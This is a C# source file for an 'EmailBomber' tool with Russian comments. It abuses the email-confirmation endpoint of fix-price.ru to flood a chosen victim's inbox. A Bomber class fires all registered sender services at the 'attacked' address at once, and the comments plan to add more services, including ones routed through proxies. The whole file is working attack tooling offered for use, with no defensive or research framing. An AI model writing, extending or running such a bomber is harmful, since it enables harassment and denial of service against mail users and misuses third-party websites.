using AngleSharp;
using AngleSharp.Dom;
using AngleSharp.Io;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace EmailBomber
{
    /// <summary>
    /// Сервис с помощью которого можно отправить письмо на почту
    /// </summary>
    interface IEmailSendService
    {
        /// <summary>
        /// Отправляет писмо на указанную почту
        /// </summary>
        /// <param name="email">Почта на которую отправится письмо с помощью</param>
        /// <returns><see cref="Task"/> на возвращение результата запроса отправки в виде <see cref="IDocument"/></returns>
        Task<IDocument> SendEmail(string email);
    }
    /// <summary>
    /// Абастрактный класс сервиса который отправляет письмо на указанную почту
    /// </summary>
    abstract class EmailSender : IEmailSendService
    {
        /// <summary>
        /// Декодирует Unicode
        /// </summary>
        /// <param name="text">Текст в формате Unicode</param>
        /// <returns></returns>
        protected static string unicodeEncode(string text)
        {
            var rx = new Regex(@"\\u([0-9A-Z]{4})", RegexOptions.Compiled | RegexOptions.IgnoreCase);
            return rx.Replace(text, p => new string((char)int.Parse(p.Groups[1].Value, NumberStyles.HexNumber), 1));
        }
        /// <summary>
        /// Констекст отправки запроса к серверу(сайту)
        /// </summary>
        protected IBrowsingContext context;
        public EmailSender()
        {
            var config = Configuration.Default
                .WithDefaultCookies()
                .WithDefaultLoader();//Использовать стандартный загрузчик и использовать куки
            context = BrowsingContext.New(config);//Инициализация конекста отправки запросов(а-ля сессия)
        }
        /// <summary>
        /// Отправляет письмо на указанный <i>email</i> и возвращает результат отправки в виде <see cref="IDocument"/>
        /// </summary>
        /// <param name="email">Целевая почта</param>
        /// <returns></returns>
        public abstract Task<IDocument> SendEmail(string email);
    }
    /// <summary>
    /// Фабрика, которая создаёт экземпляры бомберов, которые содержат в себя различные сервисы отправки. Например:
    /// <list type="bullet">
    /// <item>Содержит все сервисы</item>
    /// <item>Содержит только те сервисы, которые поддерживают отправку на все основыне почтовые сервисы(gmail, yandex, mail)</item>
    /// <item>Содержит только те сервисы, которым не нужен прокси</item>
    /// <item>Etc</item>
    /// </list>
    /// </summary>
    static class BomberFactory
    {
        /// <summary>
        /// Создает бомбер, который содержит все сервисы
        /// </summary>
        /// <param name="email">Целевая почта</param>
        /// <returns></returns>
        public static Bomber FullBomber(string email)
        {
            Bomber fullBomber = new Bomber(email);//Новый экземпляр бомбера
            fullBomber.emailSendsServices.Add(new FixPriceSender());//Добавляем в него сервис фикспрайса
            return fullBomber;//Возвращаем экземпляр
        }
    }


    /// <summary>
    /// fix-price.ru
    /// </summary>
    class FixPriceSender : EmailSender
    {
        public override async Task<IDocument> SendEmail(string email)
        {
            #region initPostData
            var postBody = new Dictionary<string, string>(); //Тело POST запроса в виде коллекции<название_поля,значение_поля>, которые передаются в теле POST запроса
            postBody.Add(@"mail_confirm", "Y");
            postBody.Add(@"action", "getCode");
            postBody.Add(@"email", email);
            var documentRequest = DocumentRequest.PostAsUrlencoded(new Url("https://fix-price.ru/ajax/confirm_mail.php"),
                postBody);//POST запрос к заданному Url'у и телом запроса
            #endregion

            var result = await context.OpenAsync(documentRequest);//Получаем результат нашего запроса на отправку письма (при готовности)
            Console.WriteLine($"{unicodeEncode(result.Source.Text)}");//Выводим результат отправки
            return result;//Возвращаем результат отправки
        }
    }
    /// <summary>
    /// Бомбер письмамами заданного email'а
    /// </summary>
    class Bomber
    {
        public string Email { get; set; }//Email для атаки
        public List<IEmailSendService> emailSendsServices = new List<IEmailSendService>();//Список сервисов для атаки

        /// <summary>
        /// Инициализация бомбера почтой для атаки
        /// </summary>
        /// <param name="email">Атакуемая почта</param>
        public Bomber(string email)
        {
            Email = email;
        }
        /// <summary>
        /// Задача на атаку почты письмами
        /// </summary>
        /// <returns></returns>
        public async Task Bomb()
        {
            //Перебор всех сервисов отправки писем и вызов у них асинхронного метода отправки письма
            var emailSendTasks = emailSendsServices.ConvertAll(service => service.SendEmail(Email));
            //Асинхронная задача на ожидание, пока все задачи в списке завершатся
            await Task.WhenAll(emailSendTasks);
        }

    }
}
